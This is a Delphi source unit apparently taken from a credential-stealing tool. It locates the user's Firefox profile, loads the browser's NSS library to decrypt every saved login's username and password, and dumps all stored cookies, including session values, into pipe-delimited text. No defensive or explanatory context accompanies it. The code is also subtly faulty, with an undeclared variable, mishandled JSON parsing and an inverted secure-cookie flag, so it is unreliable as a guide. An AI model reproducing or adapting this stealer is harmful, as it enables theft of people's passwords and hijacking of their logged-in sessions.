unit UnitFirefox;

interface

uses
  Windows, uLkJSON, SQLite3, SQLiteTable3, UnitFunctions;

function GetFirefoxPasswords(Version, FFPath: string): string;
function GetFirefoxCookies(FFPath: string): string;

implementation

function GetFirefoxPasswords(Version, FFPath: string): string;
type
  TSECItem = packed record
    SECItemType: dword;
    SECItemData: pchar;
    SECItemLen: dword;
  end;
  PSECItem = ^TSECItem;
const
  SQLQuery = 'SELECT * FROM moz_logins';
var
  NSSModule: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  hToken: THandle;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  Password: string;
  Url: string;
  Username: string;
  KeySlot: Pointer;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  SQLiteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  JSONFile: string;
  i: Integer;
  JSONObj: TlkJSONobject;
  JSONStr: TlkJSONstring;
begin
  Result := '';                                                                           
  if (FFPath = '') or (Version = '') then Exit;
  if FileExists(FFPath + 'mozsqlite3.dll') then merdadll := FFPath + 'mozsqlite3.dll' else
  if FileExists(FFPath + 'sqlite3.dll') then merdadll := FFPath + 'sqlite3.dll' else Exit;

  LoadLibrary(PChar(FFPath + 'msvcr100.dll'));
  LoadLibrary(PChar(FFPath + 'msvcp100.dll'));
  LoadLibrary(PChar(FFPath + 'msvcr120.dll'));
  LoadLibrary(PChar(FFPath + 'msvcp120.dll'));
  LoadLibrary(PChar(FFPath + 'mozglue.dll'));
  NSSModule := LoadLibrary(PChar(FFPath + 'nss3.dll'));

  @NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
  @PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
  @NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
  @PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');

  if @NSS_Init = nil then Exit;
  if @NSSBase64_DecodeBuffer = nil then Exit;
  if @PK11_GetInternalKeySlot = nil then Exit;
  if @PK11_Authenticate = nil then Exit;
  if @PK11SDR_Decrypt = nil then Exit;
  if @NSS_Shutdown = nil then Exit;
  if @PK11_FreeSlot = nil then Exit;

  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  ProfilePathLen := MAX_PATH;
  ZeroMemory(@ProfilePath, MAX_PATH);
  GetEnvironmentVariable('APPDATA', ProfilePath, ProfilePathLen);
  FirefoxProfilePath := PChar(ProfilePath + '\Mozilla\Firefox\profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);

  if StrToInt(Version) < 32 then
  begin
    MainProfilePath := PChar(ProfilePath + '\Mozilla\Firefox\' + MainProfile + '\' + 'signons.sqlite');
    SQLiteDatabase := TSQLiteDatabase.Create(MainProfilePath);
    SQLIteTable := SQLiteDatabase.GetTable(SQLQuery);

    if SQLIteTable.Count > 0 then
    begin
      if NSS_Init(PChar(ProfilePath + '\Mozilla\Firefox\' + MainProfile)) = 0 then
      begin
        KeySlot := PK11_GetInternalKeySlot;
        if KeySlot <> nil then
        begin
          if PK11_Authenticate(KeySlot, True, nil) = 0 then
          begin
            for i := 0 to SQLIteTable.Count -1 do
            begin
              Result := Result + 'Mozilla Firefox' + '|';
              Url := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['formSubmitURL']);
              Result := Result + Url + '|';

              ZeroMemory(@EncryptedSECItem, SizeOf(EncryptedSECItem));
              ZeroMemory(@DecryptedSECItem, SizeOf(DecryptedSECItem));
              Username := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedUsername']);
              NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, PChar(Username), Length(Username));
              PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
              Result := Result + DecryptedSECItem.SECItemData + '|';

              ZeroMemory(@EncryptedSECItem, SizeOf(EncryptedSECItem));
              ZeroMemory(@DecryptedSECItem, SizeOf(DecryptedSECItem));
              Password := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedPassword']);
              NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Password), Length(Password));
              PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
              Result := Result + DecryptedSECItem.SECItemData + '|' + #13#10;
              SQLIteTable.Next;
            end;
          end;//'PK11_Authenticate Failed!';
          PK11_FreeSlot(KeySlot);
        end; //'PK11_GetInternalKeySlot Failed!';
        NSS_Shutdown;
      end; //'NSS_Init Failed!';
    end;

    SQLIteTable.Free;
    SQLiteDatabase.Free;
  end
  else
  begin
    JSONFile := FileToStr(ProfilePath + '\Mozilla\Firefox\' + MainProfile + '\' + 'logins.json');
    if JSONFile = '' then Exit;
    JSONObj := TlkJSON.ParseText(JSONFile) as TlkJSONobject;

    for i := 0 to JSONObj.Count - 1 do
    begin
      Result := Result + 'Mozilla Firefox' + '|';
      JSONStr := JSONObj.Field['formSubmitURL'] as TlkJSONstring;
      Url := JSONStr.Value;
      Result := Result + Url + '|';

      JSONStr := JSONObj.Field['encryptedUsername'] as TlkJSONstring;
      Username := JSONStr.Value;
      NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Username), Length(Username));
      PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
      Result := Result + DecryptedSECItem.SECItemData + '|';

      JSONStr := JSONObj.Field['encryptedPassword'] as TlkJSONstring;
      Password := JSONStr.Value;
      NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Password), Length(Password));
      PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
      Result := Result + DecryptedSECItem.SECItemData + '|' + #13#10;
    end;

    JSONObj.Free;
  end;
end;

function GetFirefoxCookies(FFPath: string): string;
const
  SQLQuery = 'SELECT * FROM moz_cookies';
var
  SQLIteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  Domain, Name, Value, Path: string;
  Expired, HttpOnly, Secure: Boolean;
  CookiesFile: string;
  i: Integer;
begin
  Result := '';
  CookiesFile := FFPath + 'cookies.sqlite';
  if not FileExists(CookiesFile) then Exit;

  SQLIteDatabase := TSQLiteDatabase.Create(CookiesFile);
  SQLIteTable := SQLIteDatabase.GetTable(SQLQuery);

  for i := 0 to SQLIteTable.Count - 1 do
  begin
    Domain := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['host']);
    Name := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['name']);
    Path := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['path']);
    Secure := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['isSecure']) = '0';   
    Value := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['value']);

    Result := Result + 'Mozilla Firefox' + '|';
    Result := Result + Domain + '|';
    Result := Result + Name + '|';
    Result := Result + Path + '||';
    Result := Result + MyBoolToStr(Secure) + '||';
    Result := Result + Value + '|' + #13#10;

    SQLIteTable.Next;
  end;

  SQLIteTable.Free;
  SQLiteDatabase.Free;
end;

end.
